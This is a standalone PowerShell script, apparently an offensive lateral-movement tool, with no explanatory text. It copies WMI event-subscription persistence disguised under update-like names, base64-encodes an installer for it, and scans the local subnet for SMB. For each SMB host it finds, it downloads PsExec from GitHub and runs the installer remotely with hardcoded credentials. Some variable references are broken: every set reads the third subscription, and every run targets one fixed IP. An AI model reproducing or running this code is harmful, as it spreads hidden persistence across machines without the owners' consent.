function Test-Port {
    param (
        [string]$IP,
        [int]$Port,
        [int]$Timeout = 300
    )

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($IP, $Port, $null, $null)
        $success = $iar.AsyncWaitHandle.WaitOne($Timeout, $false)
        $client.Close()
        return $success
    } catch {
        return $false
    }
}
$scriptblock = {
    param($Arg1, $Arg2, $Arg3, $Arg4, $Arg5, $Arg6, $Arg7, $Arg8, $Arg9, $Arg10, $Arg11, $Arg12)

    $logPath = 'C:\Windows\Temp\smbremoting_args.txt'

    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $content = @(
        "[$timestamp]"
        "Arg1: $Arg1"
        "Arg2: $Arg2"
        "Arg3: $Arg3"
        "Arg4: $Arg4"
        "Arg5: $Arg5"
        "Arg6: $Arg6"
        "Arg7: $Arg7"
        "Arg8: $Arg8"
        "Arg9: $Arg9"
        "Arg10: $Arg10"
        "Arg11: $Arg11"
        "Arg12: $Arg12"
        "----"
    )

    $content | Out-File -FilePath $logPath -Append -Encoding UTF8

    function Install-Persistence{
        param(
            [string]$EventFilterName,   
            [string]$EventConsumerName, 
            [string]$finalPayload,      
            [string]$Query             
        )
        $EventFilterArgs = @{
            EventNamespace = 'root/cimv2'
            Name = $EventFilterName
            Query = $Query
            QueryLanguage = 'WQL'
        }
        $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
        $CommandLineConsumerArgs = @{
            Name = $EventConsumerName
            CommandLineTemplate = $finalPayload
        }
        $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
        $FilterToConsumerArgs = @{
            Filter = $Filter
            Consumer = $Consumer
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
        $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
        $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
        $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"
    };
	
    if (Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$Arg2'") {exit 0;}

    Install-Persistence -EventFilterName $Arg1 -EventConsumerName $Arg2 -Query $Arg3 -finalPayload $Arg4
    Install-Persistence -EventFilterName $Arg5 -EventConsumerName $Arg6 -Query $Arg7 -finalPayload $Arg8
    Install-Persistence -EventFilterName $Arg9 -EventConsumerName $Arg10 -Query $Arg11 -finalPayload $Arg12


	$timerId = "OneMinuteTimer_f71fa886-7d3f-4e66-ae34-e2dfa66f061d"
	$dmtfTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime((Get-Date).ToUniversalTime().AddSeconds(10))
	$timerClass = [wmiclass]"\\.\root\cimv2:__AbsoluteTimerInstruction"
	$timer = $timerClass.CreateInstance()
	$timer.TimerId = $timerId
	$timer.EventDateTime = $dmtfTime
	$timer.Put() | Out-Null
}



$FirstEventConsumerToCleanup  = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Check Uptime'"
$FirstEventFilterToCleanup    = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'SMBOperator'"
$FirstFilterName = $thirdEventFilterToCleanup.Name
$FirstConsumerName = $thirdEventConsumerToCleanup.Name
$FirstQuery = $thirdEventFilterToCleanup.Query
$FirstCommand = $thirdEventConsumerToCleanup.CommandLineTemplate
$SecondEventConsumerToCleanup  = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Google Update Cleanup'"
$SecondEventFilterToCleanup    = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'UpdateCleanup'"
$SecondFilterName = $thirdEventFilterToCleanup.Name
$SecondConsumerName = $thirdEventConsumerToCleanup.Name
$SecondQuery = $thirdEventFilterToCleanup.Query
$SecondCommand = $thirdEventConsumerToCleanup.CommandLineTemplate
$ThirdEventConsumerToCleanup  = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'SVC Edge Updater'"
$ThirdEventFilterToCleanup    = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'EdgeUpdate'"
$ThirdFilterName = $thirdEventFilterToCleanup.Name
$ThirdConsumerName = $thirdEventConsumerToCleanup.Name
$ThirdQuery = $thirdEventFilterToCleanup.Query
$ThirdCommand = $thirdEventConsumerToCleanup.CommandLineTemplate


$cmd = @"
`$sb = [ScriptBlock]::Create(@'
$($scriptblock.ToString())
'@)
& `$sb "$FirstFilterName" "$FirstConsumerName" "$FirstQuery" "$FirstCommand" "$SecondFilterName" "$SecondConsumerName" "$SecondQuery" "$SecondCommand" "$ThirdFilterName" "$ThirdConsumerName" "$ThirdQuery" "$ThirdCommand"
"@


$bytes   = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)


$ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -ExpandProperty IPAddress
foreach ($ip in $ipAddresses) {

    $octets = $ip.Split('.')
    $subnetPrefix = "{0}.{1}.{2}" -f $octets[0], $octets[1], $octets[2]
    $attempted = @{}
    for ($counter = 1; ($octets[3] - $counter) -ge 1; $counter++) {
        $lastOctet = $octets[3] - $counter
        $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet

        if ($attempted.ContainsKey($targetIP)) { continue }
        $attempted[$targetIP] = $true

        $smb = Test-Port -IP $targetIP -Port 445

        if ($smb) {
            Write-Host "Attempting SMB remoting to $targetIP"

            $return = ""
            iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe; .\test.exe \\10.10.0.5 -u duck\gilcol -p P@ssw0rd -accepteula powershell -nop -c $cmd ; del test.exe
        }
    }

    for ($counter = 1; ([int]$octets[3] + $counter) -le 254; $counter++) {
        $lastOctet = [int]$octets[3] + $counter
        $targetIP  = "{0}.{1}" -f $subnetPrefix, $lastOctet

        if ($attempted.ContainsKey($targetIP)) { continue }
        $attempted[$targetIP] = $true

        $smb = Test-Port -IP $targetIP -Port 445

        if ($smb) {
            
            Write-Host "Attempting SMB remoting to $targetIP"

            iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe; .\test.exe \\10.10.0.5 -u duck\gilcol -p P@ssw0rd -accepteula powershell -nop -c $cmd ; del test.exe
    	}
	}
}
